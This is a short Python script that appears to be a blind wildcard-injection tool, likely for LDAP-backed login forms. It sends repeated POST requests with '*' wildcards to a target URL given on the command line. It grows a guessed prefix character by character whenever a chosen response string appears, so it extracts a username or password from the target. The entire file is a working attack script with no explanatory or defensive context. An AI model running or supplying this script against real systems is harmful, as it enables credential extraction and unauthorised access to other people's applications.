import requests
import argparse
import string
import re

parser = argparse.ArgumentParser()
parser.add_argument('-u','--url',help='Target URL', required=True)
parser.add_argument('-p','--parameter',help='Parameter to target. Default is username', default='username')
parser.add_argument('-r','--result',help='Result string',default='No search results')
args = parser.parse_args()

url = args.url
param = args.parameter
results = args.result
body = {'username': '*', 'password': '*'}
result = ''

strings = list(string.ascii_letters) + list(string.digits) + list(string.punctuation)
remove_special = str.maketrans('', '', '*')
clean_list = [s.translate(remove_special) for s in strings]

test = 1
while test == 1:
    test = 0
    for x in clean_list:
        body[param] = result + x + '*'
        r = requests.post(url, data = body)
        if (results in r.text):
            result += x
            test = 1
            print(result)
            break
print('Done')
